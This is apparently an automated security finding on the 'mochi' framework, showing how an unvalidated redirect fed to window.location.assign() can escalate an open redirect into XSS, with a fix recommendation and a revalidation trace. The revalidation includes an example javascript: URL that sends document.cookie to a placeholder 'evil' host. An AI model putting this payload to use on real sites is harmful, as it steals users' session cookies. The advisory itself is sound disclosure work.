# [MEDIUM] jsonRedirect ships an unvalidated location to a client-side window.location.assign(), upgrading an app-level open redirect to same-origin XSS

**File:** [`packages/mochi/src/runtime/formsJson.ts`](https://github.com/khromov/mochi/blob/main/packages/mochi/src/runtime/formsJson.ts#L55-L57) (lines 55, 56, 57)
**Project:** mochi
**Severity:** MEDIUM  •  **Confidence:** medium  •  **Slug:** `unsafe-redirect`

## Owners

**Suggested assignee:** `stanislav.khromov+github@gmail.com` _(via last-committer)_

## Finding

`jsonRedirect` serializes the action's `location` into the enhance envelope, and the client consumes it with no scheme check: `window.location.assign(result.location)` (runtime/enhance.client.ts:60-62, documented in this file's own comment on line 55). The two transports are not equally safe. On the non-enhanced path the same value becomes a `Location:` response header (Mochi.ts:1137-1140), and browsers refuse to follow a `javascript:` (or `data:`) Location — the app's bug stays a mere open redirect. On the enhanced path `location.assign('javascript:...')` executes in the current document's origin, which is a classic XSS sink.

So an application that passes user input into `redirect()` from a form action — `redirect(303, String(formData.get('next')))`, the ubiquitous login `?next=`/`redirectTo` pattern — gets a silent severity upgrade from open redirect to script execution the moment the form is wrapped in `{@attach enhance()}`, with nothing in the framework or docs signalling the difference. The API this mirrors guards it: SvelteKit routes action redirects through `goto`, which validates the target. No in-repo app currently feeds user input to `redirect()` (the data-loading demo correctly uses `encodeURIComponent` into a path), so this is a framework hardening gap rather than a live exploit here.

## Recommendation

Validate the location where it is minted, server-side, so both transports agree: in `jsonRedirect` (or in `redirect()` itself) reject anything that is not a same-origin-relative path or an `http:`/`https:` absolute URL — e.g. parse with `new URL(location, 'http://x')` and refuse non-http(s) protocols — and additionally guard the client sink in enhance.client.ts before calling `location.assign`.

## Revalidation

**Verdict:** true-positive

Traced end-to-end and every link holds. redirect(status, location) (forms.ts:21-23) performs zero validation on `location`; a form action's redirect splits at Mochi.ts:1132-1141 into two transports; the enhanced branch calls jsonRedirect(result.status, result.location) which serializes the value verbatim (formsJson.ts:56-57), and the client sink is an unguarded window.location.assign(result.location) (enhance.client.ts:60-62), which is also the documented default (docs/74-use-enhance.md:55). The asymmetry is real: on the non-enhanced path the same string becomes a Location: response header (Mochi.ts:1137-1140), and browsers refuse to follow a javascript: or data: Location, so the app's bug stays an open redirect — whereas same-origin script calling location.assign('javascript:...') executes in the current document's origin, since the navigation initiator and the target document share an origin (the initiator-origin check browsers apply to javascript: URLs does not fire here). Top-level data: navigation is blocked, so javascript: is the live scheme. The comparison to SvelteKit is accurate — its action redirects route through goto, which rejects a target that is not same-origin. Concrete attack: an app with the ubiquitous `return redirect(303, String(formData.get('next')))` in a login action and a hidden `next` input seeded from page.url.searchParams, wrapped in {@attach enhance()} — a victim who follows /login?next=javascript:fetch('//evil/'+document.cookie) and submits gets attacker script executing on the site's origin; the identical app without enhance only gets a dead redirect. I confirmed no in-repo app is currently vulnerable (every redirect() call in site/demos/support uses a literal path, and data-loading/routes.ts:15 correctly wraps user input in encodeURIComponent inside a path segment), so this is a framework-hardening gap in a published library rather than a live exploit here. The fix belongs server-side in jsonRedirect/redirect() so both transports agree, plus a guard at the client sink. MEDIUM is the right tier: real XSS amplification, but it requires an app-level mistake to light up.

## Recent committers (`git log`)

- Stanislav Khromov <stanislav.khromov+github@gmail.com> (2026-07-27)
